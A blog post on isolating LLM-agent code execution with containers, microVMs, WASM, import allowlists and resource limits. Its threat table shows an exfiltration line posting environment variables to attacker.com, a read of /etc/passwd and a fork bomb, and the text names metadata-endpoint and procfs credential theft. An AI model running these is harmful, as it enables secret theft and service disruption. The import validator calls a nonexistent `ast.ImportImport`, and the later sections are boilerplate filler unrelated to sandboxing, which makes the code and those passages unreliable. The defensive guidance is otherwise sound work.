---
title: "Sandboxing Agent Code Execution"
slug: "agent-sandboxing-code-execution"
description: "Sandbox LLM agent code execution with containers, WASM, and resource limits. Threat models, isolation boundaries, and production patterns that actually hold."
datePublished: "2026-07-03"
dateModified: "2026-07-03"
tags: ["AI Agents", "LLM", "Security", "Architecture"]
keywords: "agent code sandbox, LLM code execution security, container sandbox agents, WASM sandbox Python, secure code execution AI"
faq:
  - q: "Why must agent code execution be sandboxed?"
    a: "Agent-generated code is untrusted input — the model can be prompt-injected into writing malicious code that exfiltrates data, accesses the filesystem, or attacks network services. Sandboxing confines execution to an isolated environment with no access to production systems, secrets, or the host network."
  - q: "What is the best sandbox for agent code execution?"
    a: "For production, use ephemeral containers (Firecracker, gVisor, or Docker with strict seccomp) with no network, read-only root filesystem, and resource limits. WASM sandboxes (Pyodide, Wasmtime) offer faster cold starts for lightweight analysis. Never execute agent code directly on the host or in the same process as your orchestrator."
  - q: "What resource limits should a code sandbox enforce?"
    a: "Set limits on CPU time (30s default), memory (256–512MB), disk write (64MB scratch), stdout size (16KB), and process count. Disable network entirely unless the use case requires it — and if it does, route through an allowlisted proxy. Kill the sandbox on any limit breach."
---

Every agent with a code execution tool is one prompt injection away from running `os.environ` on your production server. I've reviewed agent architectures where the "sandbox" was a separate Python subprocess with the same environment variables, same filesystem, and same network access as the API server. That's not a sandbox — that's remote code execution with extra steps. Real sandboxing means the agent's code runs in an environment that cannot reach your secrets, your database, or the internet, no matter what the model writes.

## Threat model

Assume the model will eventually generate code that attempts:

| Attack | Example | Mitigation |
|--------|---------|------------|
| Data exfiltration | `requests.post(attacker.com, env=os.environ)` | No network |
| Filesystem access | `open('/etc/passwd')` | Read-only root, chroot |
| Resource exhaustion | `while True: fork()` | Process limits, CPU/memory caps |
| Host escape | Exploit interpreter bug | gVisor/Firecracker, not bare Docker |
| Side-channel | Timing attacks on co-tenants | Dedicated microVMs per execution |

Design for the worst case. The model isn't malicious — but the documents it reads might be.

## Container-based sandbox (production default)

```yaml
# docker-compose for agent sandbox — illustrative
services:
  agent-sandbox:
    image: agent-python-sandbox:3.11
    read_only: true
    tmpfs:
      - /tmp:size=64M
    network_mode: "none"
    mem_limit: 512m
    cpus: 1.0
    pids_limit: 50
    security_opt:
      - no-new-privileges:true
    cap_drop:
      - ALL
```

Each execution spins up a fresh container (or microVM), runs code, captures stdout/stderr, destroys the container. No state leaks between executions unless you explicitly mount a session volume.

```python
async def execute_sandboxed(code: str, session_id: str) -> ExecutionResult:
    container = await sandbox_pool.acquire()
    try:
        result = await container.run(
            cmd=["python", "-c", code],
            timeout=30,
            max_output=16_384,
        )
        return ExecutionResult(stdout=result.stdout, stderr=result.stderr, exit_code=result.code)
    finally:
        await sandbox_pool.release(container, destroy=True)
```

Pool warm containers for latency, but destroy after each execution — pooling across tenants is a data leak vector.

## WASM sandbox (fast cold start)

For lightweight data analysis ([code REPL tools](https://blog.michaelsam94.com/agent-code-execution-repl/)), WASM offers sub-100ms startup:

- **Pyodide** — CPython compiled to WASM, runs in browser or server-side
- **Wasmtime/Wasmer** — general WASM runtime with WASI for sandboxed I/O

WASM sandboxes trade isolation depth for speed. Acceptable for read-only analysis; use containers for anything that processes untrusted file uploads.

## Import and API allowlisting

Block dangerous modules at the sandbox level, not in documentation:

```python
BLOCKED_IMPORTS = {"os", "subprocess", "socket", "shutil", "ctypes", "importlib"}

def validate_imports(code: str) -> None:
    tree = ast.parse(code)
    for node in ast.walk(tree):
        if isinstance(node, (ast.Import, ast.ImportImport)):
            for alias in node.names:
                module = alias.name.split(".")[0]
                if module in BLOCKED_IMPORTS:
                    raise SandboxViolation(f"import {module} not allowed")
```

Also restrict builtins: no `eval`, `exec`, `compile`, `__import__`. Pyodide and container images should ship with a pre-installed allowlist of libraries rather than pip-install-on-demand.

## Network isolation

Default: **no network**. If your agent needs to fetch public data:

- Route through a proxy with domain allowlisting
- Never give the sandbox access to internal service URLs
- Log every outbound request from the sandbox (there shouldn't be any)

An agent REPL that can reach your internal metadata endpoint (`169.254.169.254`) is a cloud credential theft waiting to happen.

## Observability and audit

Log every execution:
- Code hash (not full code in production logs)
- Execution time, memory peak, exit code
- stdout/stderr size
- Sandbox ID and destroy confirmation
- Session and user ID for attribution

Alert on: execution timeouts, repeated failures from same session, stdout size hitting limits (possible data dump attempt).

## Choosing your isolation level

| Use case | Isolation | Startup | Cost |
|----------|-----------|---------|------|
| Data analysis REPL | WASM / Pyodide | ~50ms | Low |
| File processing | Container (gVisor) | ~500ms | Medium |
| Untrusted user code | Firecracker microVM | ~200ms | Medium |
| Maximum isolation | Dedicated VM per run | ~2s | High |

Start with containers. Move to microVMs when you process untrusted uploads or serve multi-tenant agents where side-channel risk matters.

## Resource limits

Enforce CPU, memory, and time limits at orchestrator level:

```yaml
# Kubernetes pod spec for sandbox
resources:
  limits:
    cpu: "1"
    memory: "512Mi"
  requests:
    cpu: "250m"
    memory: "256Mi"
activeDeadlineSeconds: 60
```

OOM kill is preferable to host memory exhaustion. Set `ulimit` on max open files and process count inside container.

## Multi-tenant isolation

Shared sandbox infrastructure risks cross-tenant leakage:

- **Dedicated namespace per tenant** for enterprise
- **Ephemeral filesystem** — wipe after each execution
- **No shared /tmp** between concurrent sandboxes
- **Separate network namespace** per execution

Verify isolation with escape tests in CI — known CVE patches applied within 24h of disclosure.

Pair with [agent code execution REPL](https://blog.michaelsam94.com/agent-code-execution-repl/) for when to offer code execution vs structured tools only.

## Common production mistakes

Teams get sandboxing code execution wrong in predictable ways:

- **Skipping failure-mode rehearsal** — run a game day or fault injection exercise before peak traffic, not after the first outage.
- **Missing correlation context** — every error path should carry request, trace, or tenant identifiers so incidents are debuggable.
- **Optimizing for demo, not steady state** — load tests, cache warm-up, and cold-start paths matter more than local dev latency.
- **Undocumented trade-offs** — if you chose speed over strict correctness (or vice versa), write that down for the next engineer.

Agent systems using sandboxing code execution loop infinitely when tool errors are swallowed, subagent budgets have no hard cap, and human-in-the-loop gates are bypassed under latency pressure.

## Debugging and triage workflow

When sandboxing code execution misbehaves in production, work top-down instead of guessing:

1. **Confirm scope** — one tenant, region, or deployment stage? Narrow blast radius before deep diving.
2. **Check recent changes** — deploys, flag flips, config pushes, and schema migrations in the last 24 hours.
3. **Compare golden signals** — latency, error rate, saturation, and traffic for the affected surface vs. baseline.
4. **Reproduce minimally** — smallest input or scenario that triggers the failure; capture traces/logs with correlation IDs.
5. **Fix forward or rollback** — if rollback is faster than root-cause during incident, rollback first, postmortem second.
6. **Add a guard** — alert, integration test, or circuit breaker so the same class of failure is caught earlier next time.

Document the timeline during triage. Future you (and on-call) will need timestamps, not just conclusions.

## Output exfiltration via encoding tricks

Models learn to base64-encode secrets into stdout when network is blocked. Enforce stdout size limits and scan for high-entropy blobs before returning results to the orchestrator. Block `open('/proc/self/environ')` paths even inside containers — some images leak parent env via procfs if not masked.

## Sandbox pool sizing under burst

Black Friday agent traffic spikes concurrent code executions. Size warm pool from p99 concurrent tool calls, not average. Cold-start latency during pool exhaustion looks like model slowness — metric pool acquire wait separately from model TTFT.

## Production validation for Sandboxing Code Execution Supplement 0

Ship behind a flag when touching Sandboxing Code Execution Supplement 0; measure error rate and latency against baseline for seven days. Document rollback steps and owner on-call before enabling for enterprise tenants.

## Incident signals to watch

Alert on spikes in 5xx, client ANR rate, or support tag volume referencing Sandboxing Code Execution Supplement 0. Correlate with server deploys and Remote Config changes within ±2 hours before deep debugging client-only hypotheses.

## Resources

- [gVisor — application kernel for containers](https://gvisor.dev/docs/)
- [Firecracker microVM documentation](https://firecracker-microvm.github.io/)
- [Pyodide — Python in WebAssembly](https://pyodide.org/en/stable/)
- [E2B sandbox SDK](https://e2b.dev/docs)
- [OWASP LLM Top 10 — insecure plugin design](https://owasp.org/www-project-top-10-for-large-language-model-applications/)
- [Agent code REPL patterns](https://blog.michaelsam94.com/agent-code-execution-repl/)
